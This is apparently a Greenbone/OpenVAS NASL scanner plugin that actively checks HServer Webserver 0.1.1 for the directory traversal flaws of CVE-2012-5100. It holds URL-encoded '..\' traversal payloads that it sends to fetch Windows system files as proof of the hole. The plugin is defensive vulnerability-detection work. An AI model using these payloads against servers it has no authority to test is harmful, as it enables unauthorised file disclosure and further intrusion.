# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802410");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2012-01-06 13:10:29 +0530 (Fri, 06 Jan 2012)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2012-5100");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("HServer Webserver <= 0.1.1 Multiple Directory Traversal Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web Servers");
  script_dependencies("find_service.nasl", "httpver.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 8081);
  script_mandatory_keys("Host/runs_windows");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"HServer Webserver is prone to multiple directory traversal
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaws are due to improper validation of URI containing
  '..\..\' sequences, which allows attackers to read arbitrary files via directory traversal
  attacks.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to obtain sensitive
  information that could aid in further attacks.");

  script_tag(name:"affected", value:"HServer webserver version 0.1.1 and probably prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/521119");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/108376/hserverwebserver-traversal.txt");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");
include("port_service_func.inc");

# nb: hServer is not sending any "Server:" banner
port = http_get_port( default:8081 );

files = traversal_files( "Windows" );

exploits = make_list("/..%5c..%5c..%5c",
                     "/%2e%2e%5c%2e%2e%5c%2e%2e%5c");

foreach exploit( exploits ) {
  foreach pattern( keys( files ) ) {
    file = files[pattern];
    url = exploit + file;

    if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 0 );
